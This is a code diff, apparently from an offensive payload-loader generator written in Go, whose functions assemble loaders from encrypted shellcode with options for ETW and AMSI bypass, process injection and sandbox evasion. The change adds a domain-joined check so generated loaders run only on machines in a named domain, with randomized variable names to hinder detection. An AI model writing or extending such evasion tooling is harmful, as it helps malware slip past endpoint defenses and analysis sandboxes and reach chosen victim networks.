@@ -490,7 +490,7 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 
 }
 
-func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool) (string, string, string) {
+func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, sandboxdomain string, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool) (string, string, string) {
 	var Structure string
 	var buffer bytes.Buffer
 	Binary := &Binary{}
@@ -735,8 +735,36 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["Injecting"] = ""
 		Binary.Variables["Injected"] = ""
 	}
-
-	if sandbox == true {
+	if sandbox == true && sandboxdomain != "" {
+		if console == true {
+			Binary.Variables["SandboxOS"] = ""
+		} else {
+			Binary.Variables["SandboxOS"] = `"os"`
+		}
+		Binary.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
+		Binary.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
+		Binary.Variables["status"] = Cryptor.VarNumberLength(10, 19)
+		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox_DomainSpecific())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := SandboxFunctionTemplate.Execute(&buffer, Binary); err != nil {
+			log.Fatal(err)
+		}
+		Binary.Variables["Sandboxfunction"] = buffer.String()
+		Binary.Variables["sandboxdomain"] = sandboxdomain
+		Binary.Variables["domainresult"] = Cryptor.VarNumberLength(10, 19)
+		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainSpecificJoined())
+		buffer.Reset()
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, Binary); err != nil {
+			log.Fatal(err)
+		}
+		Binary.Variables["Sandbox"] = buffer.String()
+		buffer.Reset()
+	} else if sandbox == true {
 		if console == true {
 			Binary.Variables["SandboxOS"] = ""
 		} else {
@@ -1122,7 +1150,7 @@ func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string,
 	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" || mode == "msiexec" {
 		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, sandboxdomain, ETW, ProcessInjection, AMSI)
 	} else {
-		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name, ETW, ProcessInjection, sleep, AMSI)
+		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, sandboxdomain, name, ETW, ProcessInjection, sleep, AMSI)
 	}
 	os.MkdirAll(name, os.ModePerm)
 	Utils.Writefile(name+"/"+name+".go", code)
